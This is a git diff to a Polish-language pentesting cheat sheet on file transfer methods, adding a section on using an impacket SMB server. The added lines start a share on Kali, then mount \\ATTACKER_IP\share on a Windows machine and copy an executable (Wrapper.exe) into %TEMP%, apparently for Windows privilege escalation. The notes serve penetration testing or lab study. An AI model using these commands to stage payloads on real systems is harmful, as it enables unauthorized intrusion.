@@ -4,6 +4,7 @@
 3. [Przeslanie przez ssh scp](#Przeslanie-przez-ssh-scp)
 4. [Apache](#Apache)
 5. [Upload flask](#Upload-flask)
+6. [Using SMB server](#SMB-server)
 
 # Podzial na fragmenty
 ### Mozna przed podzieleniem zakodowac do base64
@@ -66,3 +67,17 @@ mv upload.py app.py
 flask run
 ```
 Connect i browser **127.0.0.1:5000**
+
+# SMB server
+    Uruchamiamy server na kalim:
+    sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+    
+    Na windowsie 
+    1) Podlaczamy zasow:
+       1- net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+    2) Kopiujemy pliki
+       1- copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+    3) Odlaczamy zasob
+       1- net use \\ATTACKER_IP\share /del
+    
+    Tutaj takie cos bylo robione(Uprawnienia windows)
